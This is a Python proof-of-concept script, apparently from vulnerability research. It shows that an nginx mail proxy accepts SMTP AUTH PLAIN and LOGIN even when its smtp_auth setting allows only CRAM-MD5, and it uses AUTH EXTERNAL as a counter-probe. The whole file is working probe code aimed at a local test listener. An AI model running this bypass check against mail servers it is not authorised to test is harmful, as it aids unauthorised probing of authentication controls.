#!/usr/bin/env python3
"""Minimal SMTP AUTH client for the nginx smtp_auth mask-bypass PoC.

Usage: smtp_client.py [host] [port]

Runs three independent SMTP sessions against the nginx mail listener:

  1. EHLO + AUTH PLAIN      -> expected 235 (mask does NOT list plain)
  2. EHLO + AUTH LOGIN      -> expected 235 (mask does NOT list login)
  3. EHLO + AUTH EXTERNAL   -> expected 5xx (mask lists only cram-md5,
                               and EXTERNAL *does* test the mask)

The server config uses `smtp_auth cram-md5;`, so the mask advertises only
CRAM-MD5. The auth_http backend always answers OK, so the only gate that can
reject a method is the mask. Every measured line is printed with a tag and a
final machine-readable JSON verdict is emitted as `CLIENT_VERDICT {...}`.

Exit code: 0 if bypass AND counter-probe both demonstrated, 1 otherwise.
"""

import base64
import json
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 40225

USER = "testuser"
PASS = "testpass"

TAG = "[client]"


def log(msg):
    print("%s %s" % (TAG, msg), flush=True)


def connect():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(10)
    return s, s.makefile("rb")


def read_response(f):
    """Read one (possibly multiline) SMTP response. Returns list of lines."""
    lines = []
    while True:
        raw = f.readline()
        if raw == b"":
            break
        line = raw.decode("latin1", "replace").rstrip("\r\n")
        if line == "":
            break
        lines.append(line)
        if len(line) >= 4 and line[3] == "-":
            continue
        break
    return lines


def code_of(lines):
    if not lines:
        return "000"
    return lines[-1][:3]


def send(s, line):
    s.sendall(line.encode("latin1") + b"\r\n")


def ehlo(s, f, collected):
    send(s, "EHLO poc.example.test")
    lines = read_response(f)
    for ln in lines:
        collected.append(ln)
    return lines


def session_plain(collected):
    s, f = connect()
    try:
        greeting = read_response(f)
        collected.append("PLAIN greeting: " + repr(greeting))
        ehlo(s, f, collected)
        send(s, "AUTH PLAIN")
        first = read_response(f)
        collected.append("PLAIN first: " + repr(first))
        token = base64.b64encode(
            b"\x00" + USER.encode() + b"\x00" + PASS.encode()).decode()
        send(s, token)
        final = read_response(f)
        collected.append("PLAIN final: " + repr(final))
        return code_of(first), code_of(final)
    finally:
        s.close()


def session_login(collected):
    s, f = connect()
    try:
        greeting = read_response(f)
        collected.append("LOGIN greeting: " + repr(greeting))
        ehlo(s, f, collected)
        send(s, "AUTH LOGIN")
        first = read_response(f)
        collected.append("LOGIN first: " + repr(first))
        send(s, base64.b64encode(USER.encode()).decode())
        second = read_response(f)
        collected.append("LOGIN second: " + repr(second))
        send(s, base64.b64encode(PASS.encode()).decode())
        final = read_response(f)
        collected.append("LOGIN final: " + repr(final))
        return code_of(first), code_of(second), code_of(final)
    finally:
        s.close()


def session_external(collected):
    s, f = connect()
    try:
        greeting = read_response(f)
        collected.append("EXTERNAL greeting: " + repr(greeting))
        ehlo(s, f, collected)
        send(s, "AUTH EXTERNAL")
        final = read_response(f)
        collected.append("EXTERNAL final: " + repr(final))
        return code_of(final)
    finally:
        s.close()


def main():
    collected = []
    log("target %s:%d" % (HOST, PORT))

    try:
        plain_first, plain_final = session_plain(collected)
    except OSError as e:
        log("PLAIN session error: %s" % e)
        plain_first, plain_final = "000", "000"

    try:
        login_first, login_second, login_final = session_login(collected)
    except OSError as e:
        log("LOGIN session error: %s" % e)
        login_first, login_second, login_final = "000", "000", "000"

    try:
        external_final = session_external(collected)
    except OSError as e:
        log("EXTERNAL session error: %s" % e)
        external_final = "000"

    for ln in collected:
        log("EVIDENCE " + ln)

    advertised = ""
    for ln in collected:
        if "AUTH" in ln and ln.startswith("250"):
            advertised = ln
            break

    log("EHLO AUTH advertisement: %r" % advertised)
    log("AUTH PLAIN final code : %s" % plain_final)
    log("AUTH LOGIN final code : %s" % login_final)
    log("AUTH EXTERNAL code    : %s" % external_final)

    bypass = (plain_final == "235" and login_final == "235")
    contra = (external_final.startswith("5") and external_final != "235")

    verdict = {
        "auth_plain_final": plain_final,
        "auth_login_final": login_final,
        "auth_external_final": external_final,
        "ehlo_auth_advertised": advertised,
        "bypass_shown": bool(bypass),
        "contraprobada_rejected": bool(contra),
    }
    print("CLIENT_VERDICT " + json.dumps(verdict, sort_keys=True), flush=True)
    return 0 if (bypass and contra) else 1


if __name__ == "__main__":
    sys.exit(main())
